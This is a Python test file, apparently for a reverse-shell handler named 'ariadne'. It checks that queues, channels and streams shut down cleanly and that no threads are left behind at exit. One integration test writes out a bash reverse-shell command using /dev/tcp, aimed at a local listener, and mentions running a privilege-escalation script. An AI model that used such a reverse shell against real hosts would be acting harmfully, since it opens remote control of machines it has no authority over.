import os
import select
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import ariadne
from ariadne import core, menu, options
from ariadne.engine import Session, Stream
from ariadne.network import Channel, ControlQueue, TCPListener


class ControlQueueTests(unittest.TestCase):
	def test_lshift_get_roundtrip(self):
		cq = ControlQueue()
		self.addCleanup(cq.close)
		cq << 'do-stuff'
		self.assertEqual(cq.get(), 'do-stuff')

	def test_close_unblocks_a_get_waiting_on_an_empty_queue(self):
		# Mirrors the leaked exec thread: it entered get() because select()
		# reported the queue readable, but the queue itself was empty, so it
		# blocked in queue.get() forever. close() must wake it with 'stop'.
		cq = ControlQueue()
		result = []

		def waiter():
			result.append(cq.get())

		thread = threading.Thread(target=waiter)
		thread.start()
		try:
			deadline = time.time() + 5
			while not thread.ident and time.time() < deadline:
				time.sleep(0.01)
			time.sleep(0.1)  # let it enter queue.get()
			self.assertTrue(thread.is_alive())
			cq.close()
			thread.join(timeout=5)
			self.assertFalse(thread.is_alive())
			self.assertEqual(result, ['stop'])
		finally:
			if thread.is_alive():
				self.fail("get() did not unblock on close()")

	def test_fileno_is_invalid_after_close(self):
		cq = ControlQueue()
		cq.close()
		self.assertEqual(cq.fileno(), -1)
		with self.assertRaises(ValueError):
			select.select([cq], [], [], 0)

	def test_get_after_close_returns_stop_promptly(self):
		cq = ControlQueue()
		cq << 'never-consumed'
		cq.close()
		start = time.time()
		self.assertEqual(cq.get(), 'stop')
		self.assertLess(time.time() - start, 5)


class ChannelTests(unittest.TestCase):
	def test_fileno_is_invalid_after_close(self):
		channel = Channel()
		channel.close()
		self.assertEqual(channel.fileno(), -1)
		with self.assertRaises(ValueError):
			select.select([channel], [], [], 0)

	def test_close_is_idempotent(self):
		channel = Channel()
		channel.close()
		channel.close()


class StreamTests(unittest.TestCase):
	def test_fileno_is_invalid_after_close(self):
		stream = Stream('teststream')
		stream.close()
		self.assertEqual(stream.fileno(), -1)
		with self.assertRaises(ValueError):
			select.select([stream], [], [], 0)

	def test_close_wakes_the_feed_thread(self):
		stream = Stream('teststream')
		stream << b'some data'
		self.assertIsNotNone(stream.feed_thread)
		self.assertTrue(stream.feed_thread.is_alive())
		stream.close()
		stream.feed_thread.join(timeout=5)
		self.assertFalse(stream.feed_thread.is_alive())


class TailViewerCommandTests(unittest.TestCase):
	def test_script_uses_plain_tail_f(self):
		# BusyBox and other minimal tail implementations reject 'tail -n +1 -f'
		# with "invalid number of lines: 'f'". The output file is brand new and
		# empty, so plain 'tail -f' is enough and is portable.
		with tempfile.TemporaryDirectory() as tmpdir:
			script = Path(tmpdir) / 'collector.sh'
			script.write_text('#!/bin/sh\necho hi\n')
			session = SimpleNamespace(directory=Path(tmpdir), exec=lambda *a, **k: None, agent=True)
			with patch('ariadne.engine.Open') as fake_open, \
				patch('ariadne.engine.threading.Thread') as fake_thread:
				fake_thread.return_value = SimpleNamespace(start=lambda: None)
				output = Session.script(session, str(script))
			self.assertIsNotNone(output)
			(command, *_), kwargs = fake_open.call_args
			self.assertEqual(kwargs.get('terminal'), True)
			self.assertEqual(command, f'tail -f {output}')
			self.assertNotIn('-n +1', command)


class SessionExitDrainTests(unittest.TestCase):
	"""Integration: a running script (like `run peass_ng`) must not leave the
	exec thread blocked after the exit sequence, or _thread._shutdown() hangs."""

	@classmethod
	def setUpClass(cls):
		if not shutil.which('bash'):
			raise unittest.SkipTest('bash required')
		cls.tmpdir = tempfile.TemporaryDirectory(prefix='ariadne-test-')
		_ = cls.tmpdir.name  # keep reference
		options.basedir = Path(cls.tmpdir.name)

	@classmethod
	def tearDownClass(cls):
		cls.tmpdir.cleanup()

	def test_exit_sequence_terminates_script_exec_thread(self):
		with patch('ariadne.engine.Open') as fake_open:  # do not pop terminals
			probe = socket.socket()
			probe.bind(('127.0.0.1', 0))
			port = probe.getsockname()[1]
			probe.close()

			listener = TCPListener(host='127.0.0.1', port=port)
			self.assertTrue(listener)
			self.addCleanup(listener.stop)

			target = subprocess.Popen(
				['bash', '-c', f'exec bash -i >& /dev/tcp/127.0.0.1/{port} 0>&1'],
				stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
				stdin=subprocess.DEVNULL, start_new_session=True,
			)
			self.addCleanup(target.kill)

			deadline = time.time() + 120
			while time.time() < deadline and not core.sessions:
				time.sleep(0.2)
			self.assertTrue(core.sessions, 'no session established')
			session = list(core.sessions.values())[0]
			self.addCleanup(session.kill)

			deadline = time.time() + 120
			while time.time() < deadline and not session.agent:
				time.sleep(0.2)
			self.assertTrue(session.agent, 'agent not deployed')

			script = Path(self.tmpdir.name) / 'slow.sh'
			script.write_text('#!/bin/sh\nfor i in $(seq 1 120); do echo tick-$i; sleep 1; done\n')
			output = session.script(str(script))
			self.assertIsNotNone(output)
			self.assertTrue(fake_open.call_args)
			self.assertTrue(str(fake_open.call_args[0][0]).startswith('tail -f'))

			exec_threads = [t for t in threading.enumerate()
				if 'exec' in t.name and t is not threading.main_thread()]
			self.assertTrue(exec_threads, 'script exec thread not running')

			# --- the exact do_exit sequence ---
			for sess in reversed(list(core.sessions.values())):
				sess.kill()
			for l in list(core.listeners.values()):
				l.stop()
			for fs in list(core.fileservers.values()):
				fs.stop()
			core.control << (lambda: setattr(core, 'started', False))
			menu.stop = True
			menu.cmdqueue.append("")
			menu.active.set()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join(timeout=10)

			# The exec thread must terminate promptly instead of blocking in
			# ControlQueue.get() forever. Generous budget: on loaded CI
			# runners teardown scheduling can exceed 10s without any real
			# regression; a genuinely stuck thread fails here with a full
			# stack dump.
			deadline = time.time() + 30
			while time.time() < deadline and any(t.is_alive() for t in exec_threads):
				time.sleep(0.1)
			for thread in exec_threads:
				if thread.is_alive():
					frames = sys._current_frames()
					frame = frames.get(thread.ident)
					stack = traceback.format_stack(frame) if frame else '<no frame>'
					self.fail(f'{thread.name} survived the exit sequence:\n'
						+ ''.join(stack))

			self.assertEqual(
				[t.name for t in threading.enumerate()
					if t is not threading.main_thread() and not t.daemon and t.is_alive()],
				[], 'non-daemon threads survived the exit sequence')


if __name__ == '__main__':
	unittest.main()
